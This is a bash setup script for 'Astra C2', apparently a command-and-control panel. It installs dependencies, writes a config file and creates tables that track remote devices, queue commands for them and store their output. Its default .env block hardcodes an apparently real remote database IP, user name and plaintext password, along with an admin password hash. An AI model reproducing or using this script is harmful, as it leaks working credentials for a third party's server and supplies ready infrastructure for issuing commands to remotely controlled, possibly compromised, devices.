#!/bin/bash

# Astra C2 - Setup Script
# This script checks for required dependencies and sets up the database

# ANSI color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Print banner
echo -e "${BLUE}"
echo "  ______  _____ _______ _____           _____ ___  "
echo " |  ____|/ ____|__   __|  __ \   /\    / ____|__ \ "
echo " | |__  | (___    | |  | |__) | /  \  | |       ) |"
echo " |  __|  \___ \   | |  |  _  / / /\ \ | |      / / "
echo " | |____ ____) |  | |  | | \ \/ ____ \| |____ / /_ "
echo " |______|_____/   |_|  |_|  \_\/    \_\\_____|____|"
echo -e "${NC}"
echo "Lightweight Advanced Command & Control System Setup"
echo "=================================================="
echo ""

# Check if running in Termux
if [ -d "/data/data/com.termux" ]; then
    IS_TERMUX=true
    echo -e "${YELLOW}Running in Termux environment${NC}"
else
    IS_TERMUX=false
    echo -e "${YELLOW}Running in standard Linux environment${NC}"
fi

# Check for required dependencies
echo -e "${BLUE}Checking dependencies...${NC}"

# Function to check if a command exists
command_exists() {
    command -v "$1" &> /dev/null
}

# Check for PHP
if command_exists php; then
    PHP_VERSION=$(php -v | head -n 1 | cut -d ' ' -f 2 | cut -d '.' -f 1,2)
    echo -e "${GREEN}✓ PHP version $PHP_VERSION found${NC}"
else
    echo -e "${RED}✗ PHP not found${NC}"
    if [ "$IS_TERMUX" = true ]; then
        echo -e "${YELLOW}Installing PHP in Termux...${NC}"
        pkg install -y php
    else
        echo -e "${YELLOW}Please install PHP before continuing${NC}"
        exit 1
    fi
fi

# Check for curl
if command_exists curl; then
    echo -e "${GREEN}✓ curl found${NC}"
else
    echo -e "${RED}✗ curl not found${NC}"
    if [ "$IS_TERMUX" = true ]; then
        echo -e "${YELLOW}Installing curl in Termux...${NC}"
        pkg install -y curl
    else
        echo -e "${YELLOW}Please install curl before continuing${NC}"
        exit 1
    fi
fi

# Check for MySQL client
if command_exists mysql; then
    echo -e "${GREEN}✓ MySQL client found${NC}"
else
    echo -e "${RED}✗ MySQL client not found${NC}"
    if [ "$IS_TERMUX" = true ]; then
        echo -e "${YELLOW}Installing MariaDB client in Termux...${NC}"
        pkg install -y mariadb
    else
        echo -e "${YELLOW}Please install MySQL client before continuing${NC}"
        exit 1
    fi
fi

# Check for zip/unzip
if command_exists zip && command_exists unzip; then
    echo -e "${GREEN}✓ zip/unzip found${NC}"
else
    echo -e "${RED}✗ zip/unzip not found${NC}"
    if [ "$IS_TERMUX" = true ]; then
        echo -e "${YELLOW}Installing zip/unzip in Termux...${NC}"
        pkg install -y zip unzip
    else
        echo -e "${YELLOW}Please install zip/unzip before continuing${NC}"
        exit 1
    fi
fi

echo ""
echo -e "${BLUE}Setting up environment...${NC}"

# Check if .env file exists
ENV_FILE="public_html/c2/config/.env"
ENV_EXAMPLE="public_html/c2/config/.env.example"

if [ -f "$ENV_FILE" ]; then
    echo -e "${GREEN}✓ .env file already exists${NC}"
    echo -e "${YELLOW}Would you like to recreate it? (y/n)${NC}"
    read -r recreate_env
    
    if [ "$recreate_env" = "y" ] || [ "$recreate_env" = "Y" ]; then
        # Backup existing .env
        cp "$ENV_FILE" "${ENV_FILE}.bak"
        echo -e "${GREEN}✓ Backed up existing .env to ${ENV_FILE}.bak${NC}"
        CREATE_ENV=true
    else
        CREATE_ENV=false
    fi
else
    if [ -f "$ENV_EXAMPLE" ]; then
        CREATE_ENV=true
    else
        echo -e "${RED}✗ Neither .env nor .env.example found${NC}"
        echo -e "${YELLOW}Creating a default .env file...${NC}"
        
        mkdir -p public_html/c2/config
        
        cat > "$ENV_FILE" << EOF
# Astra C2 - Configuration Settings

# Database Configuration
DB_HOST=193.203.184.212
DB_PORT=3306
DB_NAME=u831449802_devicewarden
DB_USER=u831449802_devicewarden
DB_PASSWORD=01594Wains.

# Default Admin Credentials (used if admin table doesn't exist)
DEFAULT_ADMIN_USER=admin
DEFAULT_ADMIN_PASS_HASH=\$2y\$10\$RbkPDmVbZ7XNiKhQSu3t1.X4aAQqzEM8SePXb3UTcH1yp3H7BbpjO

# API Settings
API_RATE_LIMIT=100
API_HEARTBEAT_INTERVAL=300

# Security
ENCRYPTION_KEY=$(openssl rand -base64 32)
SESSION_LIFETIME=3600

# Application Settings
APP_DEBUG=false
APP_LOG_LEVEL=info
TIME_ZONE=UTC
EOF
        echo -e "${GREEN}✓ Created default .env file${NC}"
        CREATE_ENV=false
    fi
fi

# Create the .env file if needed
if [ "$CREATE_ENV" = true ]; then
    # Copy from example
    cp "$ENV_EXAMPLE" "$ENV_FILE"
    
    # Ask for database configuration
    echo -e "${YELLOW}Please provide database configuration:${NC}"
    
    # Read default values from .env.example
    DEFAULT_DB_HOST=$(grep -oP 'DB_HOST=\K.*' "$ENV_EXAMPLE")
    DEFAULT_DB_PORT=$(grep -oP 'DB_PORT=\K.*' "$ENV_EXAMPLE")
    DEFAULT_DB_NAME=$(grep -oP 'DB_NAME=\K.*' "$ENV_EXAMPLE")
    DEFAULT_DB_USER=$(grep -oP 'DB_USER=\K.*' "$ENV_EXAMPLE")
    DEFAULT_DB_PASSWORD=$(grep -oP 'DB_PASSWORD=\K.*' "$ENV_EXAMPLE")
    
    # Prompt for values with defaults
    echo -n "Database Host [$DEFAULT_DB_HOST]: "
    read -r db_host
    db_host=${db_host:-$DEFAULT_DB_HOST}
    
    echo -n "Database Port [$DEFAULT_DB_PORT]: "
    read -r db_port
    db_port=${db_port:-$DEFAULT_DB_PORT}
    
    echo -n "Database Name [$DEFAULT_DB_NAME]: "
    read -r db_name
    db_name=${db_name:-$DEFAULT_DB_NAME}
    
    echo -n "Database User [$DEFAULT_DB_USER]: "
    read -r db_user
    db_user=${db_user:-$DEFAULT_DB_USER}
    
    echo -n "Database Password [$DEFAULT_DB_PASSWORD]: "
    read -rs db_password
    echo
    db_password=${db_password:-$DEFAULT_DB_PASSWORD}
    
    # Update .env file with new values
    sed -i "s/DB_HOST=.*/DB_HOST=$db_host/" "$ENV_FILE"
    sed -i "s/DB_PORT=.*/DB_PORT=$db_port/" "$ENV_FILE"
    sed -i "s/DB_NAME=.*/DB_NAME=$db_name/" "$ENV_FILE"
    sed -i "s/DB_USER=.*/DB_USER=$db_user/" "$ENV_FILE"
    sed -i "s/DB_PASSWORD=.*/DB_PASSWORD=$db_password/" "$ENV_FILE"
    
    # Generate a random encryption key
    ENCRYPTION_KEY=$(openssl rand -base64 32)
    sed -i "s/ENCRYPTION_KEY=.*/ENCRYPTION_KEY=$ENCRYPTION_KEY/" "$ENV_FILE"
    
    echo -e "${GREEN}✓ .env file created with your configuration${NC}"
fi

echo ""
echo -e "${BLUE}Setting up database...${NC}"

# Create the SQL setup file
SQL_SETUP_FILE="setup.sql"

cat > "$SQL_SETUP_FILE" << EOF
-- Astra C2 Database Setup for PostgreSQL

-- Create tables if they don't exist
CREATE TABLE IF NOT EXISTS devices (
    id SERIAL PRIMARY KEY,
    device_id VARCHAR(64) NOT NULL UNIQUE,
    name VARCHAR(128) NOT NULL,
    os VARCHAR(64) NOT NULL,
    ip_address VARCHAR(45) NOT NULL,
    auth_token VARCHAR(64) NOT NULL,
    last_seen TIMESTAMP NOT NULL,
    status VARCHAR(20) NOT NULL DEFAULT 'active'
);

CREATE TABLE IF NOT EXISTS commands (
    id SERIAL PRIMARY KEY,
    device_id VARCHAR(64) NOT NULL,
    command TEXT NOT NULL,
    issued_at TIMESTAMP NOT NULL,
    status VARCHAR(20) NOT NULL DEFAULT 'pending',
    output TEXT,
    CONSTRAINT fk_device
        FOREIGN KEY (device_id) 
        REFERENCES devices(device_id) 
        ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS logs (
    id SERIAL PRIMARY KEY,
    device_id VARCHAR(64) NOT NULL,
    type VARCHAR(20) NOT NULL,
    content TEXT NOT NULL,
    timestamp TIMESTAMP NOT NULL,
    CONSTRAINT fk_device_logs
        FOREIGN KEY (device_id) 
        REFERENCES devices(device_id) 
        ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS admins (
    id SERIAL PRIMARY KEY,
    username VARCHAR(64) NOT NULL UNIQUE,
    password_hash TEXT NOT NULL,
    created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
);

-- Create indexes for performance
CREATE INDEX IF NOT EXISTS idx_devices_last_seen ON devices(last_seen);
CREATE INDEX IF NOT EXISTS idx_devices_status ON devices(status);
CREATE INDEX IF NOT EXISTS idx_commands_device_id ON commands(device_id);
CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status);
CREATE INDEX IF NOT EXISTS idx_logs_device_id ON logs(device_id);
CREATE INDEX IF NOT EXISTS idx_logs_type ON logs(type);
CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON logs(timestamp);
EOF

# Read database credentials from .env file
DB_HOST=$(grep -oP 'DB_HOST=\K.*' "$ENV_FILE")
DB_PORT=$(grep -oP 'DB_PORT=\K.*' "$ENV_FILE")
DB_NAME=$(grep -oP 'DB_NAME=\K.*' "$ENV_FILE")
DB_USER=$(grep -oP 'DB_USER=\K.*' "$ENV_FILE")
DB_PASSWORD=$(grep -oP 'DB_PASSWORD=\K.*' "$ENV_FILE")

echo -e "${YELLOW}Would you like to set up the database now? (y/n)${NC}"
read -r setup_db

if [ "$setup_db" = "y" ] || [ "$setup_db" = "Y" ]; then
    echo -e "${YELLOW}Attempting to connect to database and set up tables...${NC}"
    
    # Try to run MySQL setup script
    if mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASSWORD" "$DB_NAME" < "$SQL_SETUP_FILE"; then
        echo -e "${GREEN}✓ Database tables created successfully${NC}"
    else
        echo -e "${RED}✗ Failed to set up database tables${NC}"
        echo -e "${YELLOW}You may need to manually run the SQL commands in $SQL_SETUP_FILE${NC}"
    fi
else
    echo -e "${YELLOW}Skipping database setup. You can manually run the SQL script later:${NC}"
    echo -e "${BLUE}mysql -h $DB_HOST -P $DB_PORT -u $DB_USER -p $DB_NAME < $SQL_SETUP_FILE${NC}"
fi

# Cleanup temp SQL file
rm "$SQL_SETUP_FILE"

echo ""
echo -e "${BLUE}Setting up file permissions...${NC}"

# Set proper permissions for directories
if [ -d "public_html/c2" ]; then
    chmod -R 755 public_html/c2
    chmod -R 644 public_html/c2/.htaccess
    chmod 755 public_html/c2/api
    chmod 755 public_html/c2/panel
    chmod 755 public_html/c2/assets
    chmod 755 public_html/c2/includes
    chmod 755 public_html/c2/config
    chmod 600 "$ENV_FILE"
    echo -e "${GREEN}✓ File permissions set${NC}"
else
    echo -e "${RED}✗ public_html/c2 directory not found${NC}"
fi

echo ""
echo -e "${BLUE}Creating logs directory...${NC}"

# Create logs directory if it doesn't exist
if [ ! -d "public_html/c2/logs" ]; then
    mkdir -p public_html/c2/logs
    chmod 755 public_html/c2/logs
    echo -e "${GREEN}✓ Logs directory created${NC}"
else
    echo -e "${GREEN}✓ Logs directory already exists${NC}"
fi

# Simulate server in Termux if requested
echo ""
echo -e "${YELLOW}Would you like to start a local PHP server for testing? (y/n)${NC}"
read -r start_server

if [ "$start_server" = "y" ] || [ "$start_server" = "Y" ]; then
    echo -e "${GREEN}Starting PHP server on http://localhost:8080${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop the server${NC}"
    cd public_html && php -S 0.0.0.0:8080
fi

echo ""
echo -e "${GREEN}Setup completed!${NC}"
echo -e "${BLUE}You can now access the admin panel at:${NC}"
echo -e "${YELLOW}http://your-domain.com/c2/panel/${NC}"
echo -e "${BLUE}or locally at:${NC}"
echo -e "${YELLOW}http://localhost:8080/c2/panel/${NC}"
echo ""
echo -e "${BLUE}Thank you for using Astra C2!${NC}"
